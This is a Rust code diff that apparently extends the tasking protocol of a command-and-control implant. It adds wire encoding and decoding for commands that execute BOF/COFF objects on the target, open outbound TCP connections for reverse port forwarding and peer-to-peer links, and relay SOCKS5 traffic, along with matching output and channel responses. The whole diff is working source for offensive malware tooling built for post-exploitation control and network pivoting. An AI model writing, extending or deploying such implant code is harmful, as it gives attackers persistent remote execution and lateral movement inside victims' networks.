@@ -54,6 +54,28 @@ pub enum Command {
     Download { path: String },
     /// Tear down the session cleanly.
     Exit,
+    /// Execute a COFF/BOF object: `name` is a short entry label, `args` are
+    /// string arguments, `blob` is the raw COFF bytes.
+    Bof {
+        name: String,
+        args: Vec<String>,
+        blob: Vec<u8>,
+    },
+    /// Open an outbound connection from the implant (TCP for P2P / rportfwd).
+    /// `proto` 0 = TCP; `chan` is a server-assigned channel id.
+    Connect {
+        proto: u8,
+        host: String,
+        port: u16,
+        chan: u32,
+    },
+    /// SOCKS5 relay control on a channel (`op` is a SOCKS opcode).
+    Socks {
+        chan: u32,
+        op: u8,
+        addr: String,
+        port: u16,
+    },
 }
 
 impl Command {
@@ -79,6 +101,39 @@ impl Command {
                 w.str(path);
             }
             Command::Exit => w.u8(6),
+            Command::Bof { name, args, blob } => {
+                w.u8(7);
+                w.str(name);
+                w.u32(args.len() as u32);
+                for a in args {
+                    w.str(a);
+                }
+                w.blob(blob);
+            }
+            Command::Connect {
+                proto,
+                host,
+                port,
+                chan,
+            } => {
+                w.u8(8);
+                w.u8(*proto);
+                w.str(host);
+                w.u16(*port);
+                w.u32(*chan);
+            }
+            Command::Socks {
+                chan,
+                op,
+                addr,
+                port,
+            } => {
+                w.u8(9);
+                w.u32(*chan);
+                w.u8(*op);
+                w.str(addr);
+                w.u16(*port);
+            }
         }
     }
 
@@ -96,6 +151,28 @@ impl Command {
             },
             5 => Command::Download { path: r.str()? },
             6 => Command::Exit,
+            7 => {
+                let name = r.str()?;
+                let n = r.u32()? as usize;
+                let mut args = Vec::with_capacity(n);
+                for _ in 0..n {
+                    args.push(r.str()?);
+                }
+                let blob = r.blob()?.to_vec();
+                Command::Bof { name, args, blob }
+            }
+            8 => Command::Connect {
+                proto: r.u8()?,
+                host: r.str()?,
+                port: r.u16()?,
+                chan: r.u32()?,
+            },
+            9 => Command::Socks {
+                chan: r.u32()?,
+                op: r.u8()?,
+                addr: r.str()?,
+                port: r.u16()?,
+            },
             t => return Err(WireError::BadTag(t)),
         })
     }
@@ -114,6 +191,15 @@ pub enum Response {
         name: String,
         seq: u32,
         eof: u8,
+        data: Vec<u8>,
+    },
+    /// stdout/stderr produced by a BOF execution.
+    BofOutput(Vec<u8>),
+    /// A data-channel update for `Connect`/`Socks` (status: 0=open, 1=data,
+    /// 2=closed, 3=error).
+    Channel {
+        chan: u32,
+        status: u8,
         data: Vec<u8>,
     },
 }
@@ -137,6 +223,20 @@ impl Response {
                 w.u8(*eof);
                 w.blob(data);
             }
+            Response::BofOutput(d) => {
+                w.u8(5);
+                w.blob(d);
+            }
+            Response::Channel {
+                chan,
+                status,
+                data,
+            } => {
+                w.u8(6);
+                w.u32(*chan);
+                w.u8(*status);
+                w.blob(data);
+            }
         }
     }
 
@@ -149,6 +249,12 @@ impl Response {
                 name: r.str()?,
                 seq: r.u32()?,
                 eof: r.u8()?,
+                data: r.blob()?.to_vec(),
+            },
+            5 => Response::BofOutput(r.blob()?.to_vec()),
+            6 => Response::Channel {
+                chan: r.u32()?,
+                status: r.u8()?,
                 data: r.blob()?.to_vec(),
             },
             t => return Err(WireError::BadTag(t)),
